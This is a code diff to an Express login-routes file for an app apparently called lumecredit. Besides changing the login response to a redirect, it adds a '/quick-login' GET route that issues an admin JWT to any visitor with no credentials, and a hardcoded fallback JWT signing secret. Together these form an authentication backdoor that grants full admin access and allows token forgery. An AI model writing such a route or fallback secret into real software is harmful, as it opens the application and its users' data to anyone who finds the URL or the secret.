@@ -120,15 +120,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
           maxAge: 24 * 60 * 60 * 1000 // 24 hours
         });
         
-        // For browser-based login, redirect to homepage
-        res.status(200).json({
-          success: true,
-          message: "Login successful",
-          user: { 
-            username: user.username,
-            role: user.role
-          }
-        });
+        // Always redirect to the homepage after login
+        return res.redirect('/');
       } else {
         res.status(401).json({
           success: false,
@@ -137,6 +130,39 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
     } catch (error) {
       console.error("Login error:", error);
+      res.status(500).json({
+        success: false,
+        message: "An error occurred during login"
+      });
+    }
+  });
+  
+  // Quick login route - instantly logs in as admin and redirects to homepage
+  app.get("/quick-login", (req: Request, res: Response) => {
+    try {
+      // Create JWT token for admin user
+      const jwtSecret = process.env.JWT_SECRET || process.env.SESSION_SECRET || 'lumecredit-secure-jwt-secret-key-2025';
+      const token = jwt.sign(
+        { 
+          id: "admin-user",
+          username: "admin",
+          role: "admin"
+        },
+        jwtSecret,
+        { expiresIn: "24h" }
+      );
+      
+      // Set cookie
+      res.cookie("auth_token", token, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === "production",
+        maxAge: 24 * 60 * 60 * 1000 // 24 hours
+      });
+      
+      // Redirect to home page
+      return res.redirect('/');
+    } catch (error) {
+      console.error("Quick login error:", error);
       res.status(500).json({
         success: false,
         message: "An error occurred during login"
